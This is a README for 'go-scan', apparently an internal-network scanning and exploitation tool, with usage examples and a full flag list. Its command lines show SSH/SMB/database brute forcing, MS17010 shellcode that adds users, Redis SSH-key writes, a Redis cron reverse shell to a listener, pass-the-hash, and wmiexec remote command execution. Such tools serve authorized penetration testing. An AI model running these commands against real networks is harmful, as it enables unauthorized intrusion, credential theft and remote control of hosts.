# go-scan

This tool is an intranet comprehensive scanning solution designed for automated and all-encompassing reconnaissance. It facilitates host
survival detection, port scanning, exploitation of common services, MS17010 vulnerability assessment, Redis batch public key writing,
scheduled task rebound shell, retrieval of Windows network card information, web fingerprint identification, web vulnerability scanning,
netBIOS detection, domain control identification, and various other functions.

# Features

1. **Data Collection**:
    - *Survival Detection (ICMP)*
    - *Port Scanning*

2. **Brute Force Attacks**:
    - *Various Service Brute Force Attacks (SSH, SMB, RDP, etc.)*
    - *Database Password Brute Force Attacks (MySQL, MSSQL, Redis, PSQL, Oracle, etc.)*

3. **System Information and Vulnerability Assessment**:
    - *NetBIOS Detection and Domain Control Identification*
    - *Collection of Network Interface Controller (NIC) Information*
    - *High-Risk Vulnerability Assessment (MS17010, etc.)*

4. **Web Application Detection**:
    - *Web Title Detection*
    - *Web Fingerprinting (CMS, OA Framework, etc.)*
    - *Web Vulnerability Scanning (WebLogic, ST2, etc., also supports Xray PoC)*

5. **Exploitation**:
    - *Writing Redis Public Key and Scheduled Tasks*
    - *Executing SSH Commands*
    - *Utilizing the MS17017 Vulnerability to Implant Shellcode (e.g., adding users)*

6. **Other Actions**:
    - Saving Output Results

# Instructions

Getting Started

```bash
mv go-scan_mac_arm64 /usr/local/bin/go-scan

go-scan -h 192.168.1.1/24
go-scan -h 192.168.1.1/16
```

Advanced

```bash
go-scan -h 192.168.1.1/24 -np -no -nopoc(Skip survival detection, do not save output result, skip web poc scanning)
go-scan -h 192.168.1.1/24 -rf id_rsa.pub (Redis write public key)
go-scan -h 192.168.1.1/24 -rs 192.168.1.1:6666 (Redis scheduled task rebound shell)
go-scan -h 192.168.1.1/24 -c whoami (Execute ssh command)
go-scan -h 192.168.1.1/24 -m ssh -p 2222 (Specify ssh module and port)
go-scan -h 192.168.1.1/24 -pwdf pwd.txt -userf users.txt (Load the specified file and password to blast
go-scan -h 192.168.1.1/24 -o /tmp/1.txt (Specify the path to save the scan results, which is saved in the current path by default) 
go-scan -h 192.168.1.1/8  192.x.x.1 and 192.x.x.254 of segment A, convenient for quickly viewing network segment information )
go-scan -h 192.168.1.1/24 -m smb -pwd password (Smb password crash)
go-scan -h 192.168.1.1/24 -m ms17010 (Specified ms17010 module)
go-scan -hf ip.txt  (Import target from file)
go-scan -u https://google.com -proxy 8080 (Scan a url and set http proxy http://127.0.0.1:8080)
go-scan -h 192.168.1.1/24 -nobr -nopoc (Do not blast, do not scan Web poc, to reduce traffic)
go-scan -h 192.168.1.1/24 -pa 3389 (Join 3389->rdp scan)
go-scan -h 192.168.1.1/24 -socks5 127.0.0.1:1080 (Proxy only supports simple tcp functions, and libraries with some functions do not support proxy settings)
go-scan -h 192.168.1.1/24 -m ms17010 -sc add (Built-in functions such as adding users are only applicable to alternative tools, and other special tools for using ms17010 are recommended)
go-scan -h 192.168.1.1/24 -m smb2 -user admin -hash xxxxx (Hash collision)
go-scan -h 192.168.1.1/24 -m wmiexec -user admin -pwd password -c xxxxx(Wmiexec module no echo command execution)
```

Compile command

```
go build -ldflags="-s -w " -trimpath main.go
upx -9 go-scan (Optional, compressed)
```

Full parameters

```
Usage of ./go-scan:
  -br int
        Brute threads (default 1)
  -c string
        exec command (ssh|wmiexec)
  -cookie string
        set poc cookie,-cookie rememberMe=login
  -debug int
        every time to LogErr (default 60)
  -dns
        using dnslog poc
  -domain string
        smb domain
  -full
        poc full scan,as: shiro 100 key
  -h string
        IP address of the host you want to scan,for example: 192.168.11.11 | 192.168.11.11-255 | 192.168.11.11,192.168.11.12
  -hash string
        hash
  -hf string
        host file, -hf ip.txt
  -hn string
        the hosts no scan,as: -hn 192.168.1.1/24
  -m string
        Select scan type ,as: -m ssh (default "all")
  -no
        not to save output log
  -nobr
        not to Brute password
  -nopoc
        not to scan web vul
  -np
        not to ping
  -num int
        poc rate (default 20)
  -o string
        Outputfile (default "result.txt")
  -p string
        Select a port,for example: 22 | 1-65535 | 22,80,3306 (default "21,22,80,81,135,139,443,445,1433,1521,3306,5432,6379,7001,8000,8080,8089,9000,9200,11211,27017")
  -pa string
        add port base DefaultPorts,-pa 3389
  -path string
        fcgi、smb romote file path
  -ping
        using ping replace icmp
  -pn string
        the ports no scan,as: -pn 445
  -pocname string
        use the pocs these contain pocname, -pocname weblogic
  -pocpath string
        poc file path
  -portf string
        Port File
  -proxy string
        set poc proxy, -proxy http://127.0.0.1:8080
  -pwd string
        password
  -pwda string
        add a password base DefaultPasses,-pwda password
  -pwdf string
        password file
  -rf string
        redis file to write sshkey file (as: -rf id_rsa.pub) 
  -rs string
        redis shell to write cron file (as: -rs 192.168.1.1:6666) 
  -sc string
        ms17 shellcode,as -sc add
  -silent
        silent scan
  -socks5 string
        set socks5 proxy, will be used in tcp connection, timeout setting will not work
  -sshkey string
        sshkey file (id_rsa)
  -t int
        Thread nums (default 600)
  -time int
        Set timeout (default 3)
  -top int
        show live len top (default 10)
  -u string
        url
  -uf string
        urlfile
  -user string
        username
  -usera string
        add a user base DefaultUsers,-usera user
  -userf string
        username file
  -wmi
        start wmi
  -wt int
        Set web timeout (default 5)
```

# Examples

`go-scan -h 192.168.x.x  (Open all functions, ms17010, read network card information)`

`go-scan -h 192.168.x.x -rf id_rsa.pub (Redis write public key)`

`go-scan -h 192.168.x.x -c "whoami;id" (ssh command)`

`go-scan -h 192.168.x.x -p80 -proxy http://127.0.0.1:8080 (Support for xray poc)`

`go-scan -h 192.168.x.x -p 139 (Netbios detection, domain control identification, the [+]DC in the figure below represents domain control)`

`go run .\main.go -h 192.168.x.x/24 -m netbios (Show complete netbios information)`

`go run .\main.go -h 192.0.0.0/8 -m icmp(Detect the gateway and several random IPs of each segment C, and count the number of surviving top 10 segments B and C)`

